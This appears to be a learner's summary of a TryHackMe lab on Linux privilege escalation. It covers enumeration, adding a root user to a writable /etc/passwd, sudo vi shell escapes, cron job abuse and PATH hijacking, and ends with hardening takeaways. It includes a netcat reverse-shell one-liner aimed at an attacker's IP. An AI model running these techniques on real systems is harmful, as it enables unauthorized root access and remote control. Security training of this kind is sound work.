# 🛡️ Common Linux Privesc — TryHackMe (Summary)

This room provides a practical walkthrough for common Linux privilege escalation techniques. It covers essential enumeration strategies and specific methods for gaining root access, including SUID/GUID exploitation, cron job abuse, and PATH variable manipulation.

---

## 🔍 Enumeration Basics

Effective privilege escalation begins with understanding the system environment:

- **Identity & System:** Use `hostname` to identify the machine and inspect `/etc/passwd` to view user accounts.
- **Shells:** Check `/etc/shells` to see available command-line interpreters.
- **Automation:** Use `cat /etc/crontab` to identify scheduled tasks that run with elevated privileges.
- **Permissions:** Always look for misconfigured files (e.g., world-writable `/etc/passwd` or insecure SUID bits).

---

## 🛠️ Escalation Techniques

### 1. Exploiting `/etc/passwd`
If the `/etc/passwd` file is world-writable, you can inject a new root user.
- **Process:** Generate a password hash using `openssl passwd -1 -salt [salt] [password]`.
- **Injection:** Append a new entry to the file: `username:hash:0:0:/root:/bin/bash`.
- **Result:** Switch to the new user using `su [username]` to obtain a root shell.

### 2. Sudo & Vi Editor
Sometimes users are granted `sudo` permissions to run binaries like `vi` without a password.
- **Check:** Run `sudo -l` to see allowed commands.
- **Escape:** Inside `vi`, run `:!sh` to spawn a shell with the privileges of the user who owns the binary.

### 3. Abusing Cron Jobs
If a script run by `cron` is writable, you can replace its content with a reverse shell payload.
- **Payload Example:** `mkfifo /tmp/f; nc [IP] [PORT] 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- **Mechanism:** Once the cron job executes, it will trigger the reverse shell back to your attacking machine with root privileges.

### 4. PATH Variable Hijacking
If a script executes a system command (like `ls`) without an absolute path, you can manipulate the `PATH` environment variable.
- **Hijack:** Create a malicious file named `ls` containing `/bin/bash` in a directory like `/tmp`.
- **Execute:** `chmod +x ls` and update the path with `export PATH=/tmp:$PATH`.
- **Result:** Running the vulnerable script will now execute your malicious `ls` instead of the system binary.

---

## 🧠 Career Direction Insight

This room builds critical post-exploitation skills necessary for security assessments and red teaming.

- **Current Learning Focus:** System Enumeration + Privilege Escalation
- **Target Role:** Penetration Tester / Junior Security Analyst

---

## 📊 Key Takeaways

- Enumeration is the most important step; misconfigurations are the primary source of privilege escalation.
- Automated tasks (`cron`) and environment variables (`PATH`) are common vectors for escalation.
- Always check SUID bits on binaries as they can be leveraged to gain higher privileges.
- Properly securing configuration files and limiting sudo permissions significantly hardens a system.

---

## 🧠 Final Summary

Linux privilege escalation is a structured process of identifying misconfigurations and finding ways to force the system to execute code with higher-level permissions. Mastering these techniques—from modifying configuration files to exploiting environmental variables—is essential for understanding how to secure Linux environments effectively.

---

**Task Status: ✔ Completed**